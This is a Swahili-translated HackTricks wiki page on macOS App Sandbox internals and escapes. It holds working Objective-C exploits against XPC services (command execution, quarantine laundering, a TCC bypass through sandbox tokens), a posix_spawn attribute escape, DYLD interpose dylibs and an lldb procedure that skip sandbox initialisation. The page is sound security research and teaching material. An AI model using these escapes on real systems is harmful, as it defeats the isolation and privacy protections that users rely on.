# macOS Sandbox Debug & Bypass

{{#include ../../../../../banners/hacktricks-training.md}}

## Mchakato wa kupakia Sandbox

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Picha kutoka <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

Katika picha iliyotangulia inawezekana kuona **jinsi sandbox itakavyopakiwa** programu yenye entitlement **`com.apple.security.app-sandbox`** inapoendeshwa.

Compiler itaunganisha `/usr/lib/libSystem.B.dylib` na binary.

Kisha, **`libSystem.B`** huita functions kadhaa hadi **`xpc_pipe_routine`** itume entitlements za programu kwa **`securityd`**. Securityd hukagua ikiwa mchakato unapaswa kutengwa ndani ya sandbox, na ikiwa ndivyo, huutenga.\
Hatimaye, sandbox huwashwa kwa kuita **`__sandbox_ms`**, ambayo huita **`__mac_syscall`**.<sup>[[1]](#references)[[3]](#references)</sup>

## Mbinu zinazowezekana za Bypass

### Kubypass sifa ya quarantine

**Faili zinazoundwa na michakato iliyo kwenye sandbox** huongezewa **sifa ya quarantine** ili kuzuia sandbox escapes: ukidondosha programu mpya na kujaribu kuiwasha, quarantine flag huizuia. Kwa hiyo, **ukiweza kudondosha faili au folda *bila* sifa ya quarantine, unaweza kutoroka App Sandbox** — dondosha tu `.app` bundle na uiwashe kwa `open`, kwa kuwa mchakato mpya ulioanzishwa huendeshwa chini ya LaunchServices na si chini ya sandbox yako.

Njia ya kuaminika ya **kudondosha faili bila quarantine** ni kuiomba **process nyingine ikuundie faili**. Kama ilivyoelezwa katika [**A New Era of macOS Sandbox Escapes**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) na Mickey Jin, **App Sandbox** huweka quarantine kwenye faili zilizodondoshwa, lakini **XPC services zinazoendeshwa chini ya Service Sandbox hazifanyi hivyo**. Kwa hiyo, XPC services kadhaa zisizohitaji uthibitishaji zinaweza kutumiwa kama primitive ya "quarantine laundering":<sup>[[4]](#references)</sup>

- **CVE-2023-27944** (`TrialArchivingService`) na **CVE-2023-32414** (`ArchiveService`): hutoa yaliyomo kwenye archive iliyopitishwa na programu iliyo kwenye sandbox hadi eneo lililochaguliwa **bila kuhamisha quarantine xattr** hadi kwenye yaliyomo yaliyotolewa.
- **CVE-2023-42977** (`PerfPowerServicesSignpostReader`): path traversal katika `submitSignpostDataWithConfig:` iliwezesha kuunda **directories kiholela bila quarantine**, jambo linalotosha kujenga muundo mzima wa `.app` bundle nje ya container.
- **CVE-2024-27864** (`diskimagescontroller.xpc`): huambatisha DMG iliyo na quarantine **bila kuweka quarantine kwenye kifaa kinachotokana nayo**, kwa hiyo programu zilizo kwenye volume iliyowekwa mount zinaweza kuwashwa.

> [!TIP]
> Kutoa yaliyomo kwa kawaida **huondoa ruhusa ya executable**. Workaround iliyotumiwa katika CVE-2023-27944 ilikuwa kuweka **symlink** ya binary ya mfumo iliyosainiwa tayari (k.m. `/System/Library/CoreServices/Automator Application Stub`) kama executable kuu ya bundle, ambayo huiwezesha kuwashwa bila kuhitaji `+x` kwenye faili iliyodondoshwa.

> [!CAUTION]
> Sababu inayofanya hili lifanye kazi ni kwamba ukaguzi hutegemea **flag iliyo kwenye kipengee kinachowashwa**: *"Programu au executable code nyingine inapoendeshwa kutoka Finder au GUI, macOS hukagua quarantine flag yake kabla ya kuipakia"*, na ndipo tu *"hupelekwa kwa Gatekeeper kwa ukaguzi kamili wa usalama wa 'first run'"* ([Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)). Kutokuwa na flag kwenye bundle unayowasha kunamaanisha hakuna ukaguzi wa Gatekeeper — ambayo ndiyo primitive inayotolewa na CVE zilizo hapo juu.<sup>[[5]](#references)</sup>
>
> Kumbuka kuwa ikiwa `.app` bundle tayari imeidhinishwa kuendeshwa (ina quarantine xattr yenye flag ya "authorized to run"), unaweza pia kuitumia vibaya... isipokuwa sasa huwezi kuandika ndani ya **`.app`** bundles bila kuwa na TCC perms zenye upendeleo (ambazo hutakuwa nazo ndani ya sandbox).

### Kutumia vibaya utendaji wa Open

Katika [**mifano ya mwisho ya Word sandbox bypass**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) inaonekana jinsi utendaji wa cli ya **`open`** unavyoweza kutumiwa vibaya ili kubypass sandbox.


{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Launch Agents/Daemons

Hata kama programu **imekusudiwa kuwa kwenye sandbox** (`com.apple.security.app-sandbox`), inawezekana kubypass sandbox ikiwa **imeendeshwa kutoka LaunchAgent** (`~/Library/LaunchAgents`), kwa mfano.\
Kama ilivyoelezwa katika [**chapisho hili**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), ukitaka kupata persistence kwa kutumia programu iliyo kwenye sandbox, unaweza kuifanya ijiendeshe kiotomatiki kama LaunchAgent na pengine kuingiza code hasidi kupitia DyLib environment variables.<sup>[[6]](#references)</sup>

### Kutumia vibaya Maeneo ya Auto Start

Ikiwa mchakato ulio kwenye sandbox unaweza **kuandika** mahali ambapo **programu isiyo kwenye sandbox itaendesha binary baadaye**, utaweza **kutoroka kwa kuiweka tu** binary hapo. Mifano mizuri ya maeneo ya aina hii ni `~/Library/LaunchAgents` au `/System/Library/LaunchDaemons`.

Kwa hili huenda ukahitaji hata **hatua 2**: Kufanya mchakato wenye **sandbox inayoruhusu zaidi** (`file-read*`, `file-write*`) uendeshe code yako, ambayo itaandika mahali ambapo **itaendeshwa bila sandbox**.

Angalia ukurasa huu kuhusu **maeneo ya Auto Start**:


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### Kutumia vibaya michakato mingine

Ikiwa kutoka kwenye mchakato ulio kwenye sandbox unaweza **kucompromise michakato mingine** inayoendeshwa kwenye sandboxes zenye vizuizi vichache (au bila sandbox), utaweza kutoroka hadi kwenye sandboxes zao:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### Huduma za Mach za Mfumo na Mtumiaji zinazopatikana

Sandbox pia huruhusu mawasiliano na **Mach services** fulani kupitia XPC zilizobainishwa kwenye profile `application.sb`. Ukiweza **kutumia vibaya** mojawapo ya huduma hizi unaweza **kutoroka sandbox**.

Kama ilivyoelezwa katika [writeup hii](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), taarifa kuhusu Mach services huhifadhiwa kwenye `/System/Library/xpc/launchd.plist`. Inawezekana kupata Mach services zote za Mfumo na Mtumiaji kwa kutafuta `<string>System</string>` na `<string>User</string>` ndani ya faili hiyo.<sup>[[4]](#references)</sup>

Zaidi ya hayo, inawezekana kukagua ikiwa Mach service inapatikana kwa programu iliyo kwenye sandbox kwa kuita `bootstrap_look_up`:

```objectivec
void checkService(const char *serviceName) {
    mach_port_t service_port = MACH_PORT_NULL;
    kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
    if (!err) {
      NSLog(@"available service:%s", serviceName);
      mach_port_deallocate(mach_task_self_, service_port);
    }
}

void print_available_xpc(void) {
    NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
    NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
    for (NSString* key in launchDaemons) {
      NSDictionary<NSString*, id>* job = launchDaemons[key];
      NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
      for (NSString* serviceName in machServices) {
          checkService(serviceName.UTF8String);
      }
    }
}
```

### Huduma za PID Mach zinazopatikana

Huduma hizi za Mach zilitumiwa kwa mara ya kwanza [kutoroka kwenye sandbox katika maandishi haya](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). Kufikia wakati huo, **huduma zote za XPC zinazohitajika** na programu na framework yake zilionekana kwenye domain ya PID ya app (hizi ni Mach Services zenye `ServiceType` kama `Application`).<sup>[[4]](#references)</sup>

Ili **kuwasiliana na huduma ya XPC ya PID Domain**, inahitajika tu kuisajili ndani ya app kwa mstari kama huu:

```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```

Zaidi ya hayo, inawezekana kupata huduma zote za Mach za **Application** kwa kutafuta `<string>Application</string>` ndani ya `System/Library/xpc/launchd.plist`.

Njia nyingine ya kupata huduma halali za xpc ni kuangalia zile zilizo ndani ya:

```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```

Mifano kadhaa ya kutumia vibaya mbinu hii inaweza kupatikana katika [**maelezo ya awali**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), hata hivyo, ifuatayo ni baadhi ya mifano iliyofupishwa.<sup>[[4]](#references)</sup>

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

Huduma hii huruhusu kila muunganisho wa XPC kwa kurudisha `YES` kila wakati, na mbinu ya `runTask:arguments:withReply:` hutekeleza amri yoyote kwa params zozote.

Exploit ilikuwa "rahisi kiasi hiki":

```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
    [conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
    [conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
    [conn resume];
    
    [[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
        NSLog(@"run task result:%@, error:%@", bSucc, error);
    }];
}
```

#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

Huduma hii ya XPC iliruhusu kila client kwa kurudisha `YES` kila wakati, na method ya `createZipAtPath:hourThreshold:withReply:` ilikubali path ya folder na kuibana kuwa faili la ZIP.

Kwa hivyo, inawezekana kutengeneza muundo bandia wa folder ya app, kuubana, kisha kuufungua na kuutekeleza ili kutoroka sandbox, kwa kuwa faili mpya hazitakuwa na sifa ya quarantine.

Exploit ilikuwa:

```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
    NSString *currentPath = NSTemporaryDirectory();
    chdir([currentPath UTF8String]);
    NSLog(@"======== preparing payload at the current path:%@", currentPath);
    system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
    [@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
    system("chmod +x compressed/poc.app/Contents/MacOS/poc");
    
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
    [conn resume];
    
    [[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
        NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
        NSString *file;
        while ((file = [dirEnum nextObject])) {
            if ([[file pathExtension] isEqualToString: @"zip"]) {
                // open the zip
                NSString *cmd = [@"open " stringByAppendingString:file];
                system([cmd UTF8String]);

                sleep(3); // wait for decompression and then open the payload (poc.app)
                NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
                system([cmd2 UTF8String]);
                break;
            }
        }
    }];
}
```

#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

Huduma hii ya XPC huruhusu kutoa ruhusa ya kusoma na kuandika kwa URL yoyote kwa mteja wa XPC kupitia method `extendAccessToURL:completion:` ambayo ilikubali connection yoyote. Kwa kuwa huduma ya XPC ina FDA, inawezekana kutumia vibaya ruhusa hizi ili kukwepa TCC kabisa.

Exploit ilikuwa:

```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
    [conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
    [conn resume];
    
    [[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
        NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
        NSURL *targetURL = [fpWrapper url];
        
        void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
        PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
        if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
            NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
        else {
            NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
            NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
        }
    }];
}
```

### Kukompile kwa Static na ku-link Dynamically

[**Utafiti huu**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) uligundua njia 2 za kukwepa Sandbox. Kwa sababu Sandbox hutumika kutoka userland wakati library ya **libSystem** inapopakiwa, binary ingeweza kuepuka kupakiwa kwa library hiyo na hivyo isingewahi kuwekwa kwenye Sandbox:<sup>[[2]](#references)</sup>

- Ikiwa binary **ingekompilewa kabisa kwa Static**, ingeweza kuepuka kupakia library hiyo.
- Ikiwa **binary isingehitaji kupakia library zozote** (kwa sababu linker pia iko kwenye libSystem), isingehitaji kupakia libSystem.

### Shellcodes

Kumbuka kwamba **hata shellcodes** katika ARM64 zinahitaji ku-linkiwa na `libSystem.dylib`:

```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```

### Vikwazo visivyorithiwa

Kama ilivyoelezwa katika **[sehemu ya ziada ya makala hii](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)**, kizuizi cha sandbox kama:<sup>[[4]](#references)</sup>

```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```

inaweza kuepukwa kwa mchakato mpya kutekeleza, kwa mfano:

```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```

Hata hivyo, bila shaka, mchakato huu mpya hautarithi entitlements au privileges kutoka kwa mchakato mzazi.

### Kubadilisha sandbox iliyorithiwa kwa kutumia spawn attributes (macOS za zamani)

Mchakato wa kawaida wa mtoto wa `posix_spawn()` hurithi sandbox ya mzazi wake. Kwenye matoleo ya macOS kabla ya marekebisho ya Februari 2026, mchakato mzazi uliowekwa kwenye sandbox ungeweza badala yake kupitisha **jina la profile iliyojengewa ndani** kwa sera ya `Sandbox` MAC kupitia `posix_spawnattr_setmacpolicyinfo_np()`. Kisha mtoto alipokea profile hiyo *badala ya* vizuizi vya mzazi. Profile iliyojengewa ndani ya `no-network` bado iliruhusu ufikiaji wa saraka ya nyumbani ya mtumiaji, kwa hivyo mtoto kama `/bin/bash` angeweza kushughulikia faili ambazo mzazi wa App Sandbox hangeweza. Hii ni tofauti na njia ya [LaunchServices `open`](#not-inherited-restrictions), ambapo huduma tofauti huanzisha mchakato. Tazama [MACF policy-specific spawn attributes](../../macos-macf-mandatory-access-control-framework.md#policy-specific-spawn-attributes-as-a-macf-input) kwa maelezo ya jumla kuhusu njia ya ingizo.<sup>[[7]](#references)</sup>

Ili kujaribu mpaka wa usalama kwenye **host ya macOS iliyoathiriwa na iliyotengwa**, unda canary isiyo na madhara kwenye saraka ya nyumbani, nje ya kontena la app. Endesha mtoto yuleyule kutoka kwa mchakato mzazi ambao tayari uko kwenye sandbox, kwanza kwa kutumia `posix_spawn()` ya kawaida, kisha kwa kutumia blob ya Sandbox spawn-attribute inayochagua `no-network`; linganisha kama mtoto anaweza kusoma canary. Kipande kifuatacho kinatumia ufafanuzi wa faragha wa `sandbox_spawnattr_t` na matamko ya function kutoka kwa [sample launcher](https://gist.github.com/Siguza/e9e6e2387b11ee5aec1b1c27c60d43ec) ya Siguza. Ongeza ushughulikiaji wa kawaida wa makosa unapokiunganisha kwenye app ya majaribio.<sup>[[7]](#references)[[8]](#references)</sup>

```c
sandbox_spawnattr_t sb;
posix_spawnattr_t attr;
pid_t pid;
char *argv[] = {"/bin/bash", "-c", "cat \"$HOME/sandbox-canary.txt\"", NULL};
sandbox_spawnattrs_init(&sb);
sandbox_spawnattrs_setprofilename(&sb, "no-network");
posix_spawnattr_init(&attr);
posix_spawnattr_setmacpolicyinfo_np(&attr, "Sandbox", &sb, sizeof(sb));
int err = posix_spawn(&pid, "/bin/bash", NULL, &attr, argv, environ);
if (!err) waitpid(pid, NULL, 0);
```

Marejesho yenye mafanikio kutoka kwa `posix_spawn()` hayathibitishi kuwa sandbox imevukwa: kagua **ufikiaji halisi wa faili wa child** ukilinganisha na hali ya kawaida ya child. Mifumo iliyorekebishwa hukataa profile iliyojengewa ndani iliyoombwa na caller ambaye tayari yuko kwenye sandbox, isipokuwa awe na entitlement ya faragha `com.apple.private.security.sandbox-spawnattrs`. Usichukulie tabia hii ya zamani kama njia ya sasa ya kuvuka sandbox.<sup>[[7]](#references)</sup>

### Entitlements

Kumbuka kwamba hata kama baadhi ya **vitendo** vinaweza **kuruhusiwa na sandbox** ikiwa programu ina **entitlement** maalum, kama ilivyo hapa:

```scheme
(when (entitlement "com.apple.security.network.client")
      (allow network-outbound (remote ip))
      (allow mach-lookup
             (global-name "com.apple.airportd")
             (global-name "com.apple.cfnetwork.AuthBrokerAgent")
             (global-name "com.apple.cfnetwork.cfnetworkagent")
             [...]
```

### Interposting Bypass

Kwa maelezo zaidi kuhusu **Interposting**, angalia:


{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### Interpost `_libsecinit_initializer` ili kuzuia sandbox

```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
    printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
	void (*overriden__libsecinit_initializer)(void);
	void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```

#### Kuingilia `__mac_syscall` ili kuzuia Sandbox

```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
    printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
    if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
        printf("Bypassing Sandbox initiation.\n");
        return 0; // pretend we did the job without actually calling __mac_syscall
    }
    // Call the original function for other cases
    return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
    const void *replacement;
    const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
    { (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```

### Kutatua hitilafu na kukwepa Sandbox kwa kutumia lldb

Tukusanye programu inayopaswa kuwekwa ndani ya Sandbox:

{{#tabs}}
{{#tab name="sand.c"}}

```c
#include <stdlib.h>
int main() {
    system("cat ~/Desktop/del.txt");
}
```

{{#endtab}}

{{#tab name="entitlements.xml"}}

```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="Info.plist"}}

```xml
<plist version="1.0">
<dict>
    <key>CFBundleIdentifier</key>
    <string>xyz.hacktricks.sandbox</string>
    <key>CFBundleName</key>
    <string>Sandbox</string>
</dict>
</plist>
```

{{#endtab}}
{{#endtabs}}

Kisha compile programu:

```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```

> [!CAUTION]
> App itajaribu **kusoma** faili **`~/Desktop/del.txt`**, jambo ambalo **Sandbox haitaruhusu**.\
> Unda faili humo, kwa kuwa ikishavukwa Sandbox, app itaweza kuisoma:
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

Hebu tufanye debug ya application ili kuona Sandbox inapakiwa lini:

```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
  * frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
    frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
    frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
    frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
    frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
  x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
    frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
    0x187659904 <+4>:  svc    #0x80
    0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
    0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```

> [!WARNING] > **Hata Sandbox ikipitwa, TCC** itamuuliza mtumiaji kama anataka kuruhusu mchakato kusoma faili kutoka kwenye desktop

## References

- [1] [Jonathan Levin - Sandbox ya Apple: Kuchunguza Zaidi Mambo Magumu (slides za HITB GSEC 2016)](http://newosxbook.com/files/HITSB.pdf)
- [2] [Saagar Jha - Kutoroka kwenye Sandbox ya Mac App Store](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [3] [Jonathan Levin - Sandbox ya Apple: Kuchunguza Zaidi Mambo Magumu (HITB GSEC 2016)](https://www.youtube.com/watch?v=mG715HcDgO8)
- [4] [Mickey Jin - Enzi Mpya ya Kutoroka kwenye Sandbox ya macOS](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) (unquarantined drops via XPC services: CVE-2023-27944, CVE-2023-32414, CVE-2023-42977, CVE-2024-27864)
- [5] [The Eclectic Light Company - Ufafanuzi: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)
- [6] [Vicarius vSociety - CVE-2023-26818 (Sandbox): Kupita TCC ya macOS kwa kutumia Telegram kupitia DyLib Injection (Sehemu ya 2)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)
- [7] [Kutoroka kwenye Apple Sandbox kwa Kuanzisha Executable](https://wts.dev/posts/sandbox-spawnattrs-escape/)
- [8] [Siguza - sandbox-exec lakini kwa profiles zilizojengewa ndani](https://gist.github.com/Siguza/e9e6e2387b11ee5aec1b1c27c60d43ec)
{{#include ../../../../../banners/hacktricks-training.md}}
